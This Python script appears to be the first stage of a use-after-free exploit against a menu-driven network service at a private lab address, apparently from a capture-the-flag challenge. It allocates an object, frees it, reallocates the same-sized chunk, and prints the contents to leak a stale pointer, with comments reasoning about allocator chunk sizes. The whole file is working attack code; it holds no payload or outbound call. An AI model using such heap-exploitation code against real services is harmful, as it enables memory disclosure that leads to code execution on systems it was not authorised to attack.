import socket
import time
import struct
import sys

host = "10.2.0.5"
port = 10004


def recv_until(s, delim):
    data = b""
    while not data.endswith(delim):
        chunk = s.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def leak():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    recv_until(s, b"> ")

    # Alloc B
    print("[*] Allocating B...")
    s.sendall(b"2\n")
    recv_until(s, b": ")  # Name
    s.sendall(b"BBBB\n")
    recv_until(s, b"> ")

    # Free B
    print("[*] Freeing B...")
    s.sendall(b"4\n")
    recv_until(s, b"> ")

    # Alloc A (Try size 32 - typical chunk size for small struct)
    # B likely contains: Name ptr/buffer, Callback ptr.
    # If Name is inline 8 bytes + 8 bytes callback = 16 bytes.
    # Allocator uses min chunk size (usually 32 bytes on 64-bit).
    print("[*] Allocating A (Size 24)...")
    # Try 24 to avoid overwriting everything if it clears?
    # Wait, malloc usually doesn't clear.
    s.sendall(b"1\n")
    recv_until(s, b": ")
    s.sendall(b"32\n")
    recv_until(s, b"> ")

    # Show A
    print("[*] Show A...")
    s.sendall(b"6\n")
    # Output format: "Data: <content>"
    out = recv_until(s, b"> ")
    print(f"Output: {out}")

    s.close()


if __name__ == "__main__":
    leak()
